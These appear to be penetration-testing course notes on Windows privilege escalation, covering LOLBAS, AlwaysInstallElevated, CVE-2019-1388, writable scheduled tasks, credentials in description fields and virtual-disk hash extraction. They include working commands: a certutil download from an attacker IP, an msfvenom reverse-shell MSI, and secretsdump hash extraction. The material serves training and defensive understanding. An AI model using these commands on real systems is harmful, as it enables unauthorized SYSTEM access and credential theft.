# Miscellaneous Windows PrivEsc Techniques

---

## 1. Living Off The Land Binaries (LOLBAS)

The [LOLBAS project](https://lolbas-project.github.io/) documents Microsoft-signed binaries, scripts, and libraries with unintended attacker-useful functionality including: code execution, file transfers, persistence, UAC bypass, credential theft, process memory dumping, keylogging, evasion, and DLL hijacking.

**Example — certutil.exe (intended for certificate handling but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file):**

```powershell
# Download a file
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

# Encode a file to base64
certutil -encode file1 encodedfile

# Decode back
certutil -decode encodedfile file2
```

**Example — rundll32.exe:** Execute a `.dll` payload to get a reverse shell (hosted locally or on an SMB share).

> Particularly valuable during evasive assessments or when restricted to a managed Windows host.

---

## 2. AlwaysInstallElevated

When enabled, any `.msi` installer runs with SYSTEM privileges — regardless of who executes it.

**Set via Group Policy at:**
```
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
User Configuration\Administrative Templates\Windows Components\Windows Installer
```

**Check if enabled (both keys must be set to `0x1`):**
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**Generate a malicious MSI:**
```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

**Execute on target:**
```cmd
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```
→ Reverse shell returned as `NT AUTHORITY\SYSTEM`.

**Mitigation:** Disable both Group Policy settings listed above.

---

## 3. CVE-2019-1388 — Windows Certificate Dialog UAC Bypass

A UAC bypass in the Windows Certificate Dialog — the "Issued by" field in a certificate containing OID `1.3.6.1.4.1.311.2.1.10` (SpcSpAgencyInfo) renders as a clickable hyperlink. Clicking it opens a browser window running as `NT AUTHORITY\SYSTEM`.

**Steps:**
1. Right-click `hhupd.exe` (old Microsoft-signed binary) → **Run as administrator**
2. Click **"Show information about the publisher's certificate"**
3. In the **General** tab, click the hyperlink in the **Issued by** field → browser opens as SYSTEM
4. Right-click webpage → **View page source** → right-click again → **Save as** → dialog box opens
5. In the file path field type: `c:\windows\system32\cmd.exe` → press Enter → cmd spawns as SYSTEM

**Verify:** Task Manager confirms browser process runs as `SYSTEM`.

> Patched November 2019 — still encountered on unpatched systems. Only exploitable with GUI access. Check [vulnerable OS list](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1388) before attempting.

---

## 4. Scheduled Tasks

**Enumerate scheduled tasks:**
```cmd
schtasks /query /fo LIST /v
```
```powershell
Get-ScheduledTask | select TaskName,State
```

> Standard users can't read tasks created by admins (`C:\Windows\System32\Tasks` is restricted). However, if a task's **associated script** is stored in a world-writable location, appending code to it is a viable persistence/escalation path.

**Check permissions on script directories:**
```cmd
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```

If `BUILTIN\Users` has write access to a directory containing scheduled task scripts → append a payload (reverse shell/beacon) → wait for the task to run as SYSTEM overnight.

---

## 5. User/Computer Description Fields

Sysadmins sometimes store passwords in description fields — check these:

**Local users:**
```powershell
Get-LocalUser
```
Look for entries like `secsvc True  Network scanner - do not change password`.

**Computer description:**
```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

---

## 6. Mount Virtual Hard Drives (.vhd, .vhdx, .vmdk)

Found on file shares or backups — mounting them gives access to the target OS filesystem, including the SAM/SYSTEM/SECURITY hives for offline hash extraction.

**Mount on Linux:**
```bash
# VMDK (VMware)
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

# VHD/VHDX (Hyper-V)
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

**Mount on Windows:**
- `.vhd`/`.vhdx`: Right-click → Mount, or `Mount-VHD` PowerShell cmdlet, or Disk Management
- `.vmdk`: Right-click → Map Virtual Disk, or VMware Workstation → File → Map Virtual Disks, or add as additional virtual disk, or extract with **7-Zip**

**Extract hashes after mounting:**
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
Pull `SAM`, `SECURITY`, and `SYSTEM` from `C:\Windows\System32\Config` on the mounted volume → extract local admin NTLM hashes → use for pass-the-hash or offline cracking.

---

## Key Takeaways

| Technique | Condition | Outcome |
|---|---|---|
| LOLBAS (certutil, rundll32, etc.) | Always available on Windows | File transfer, code exec, evasion |
| AlwaysInstallElevated | Both registry keys = `0x1` | SYSTEM via malicious MSI |
| CVE-2019-1388 | GUI access; unpatched (pre-Nov 2019) | SYSTEM shell via browser breakout |
| Writable scheduled task scripts | Write access to task script dir | SYSTEM code execution on next task run |
| User/computer description fields | Lazy sysadmin storing creds | Plaintext credential discovery |
| Virtual disk mounting | `.vmdk`/`.vhd`/`.vhdx` on share | SAM/SYSTEM hives → local hash extraction |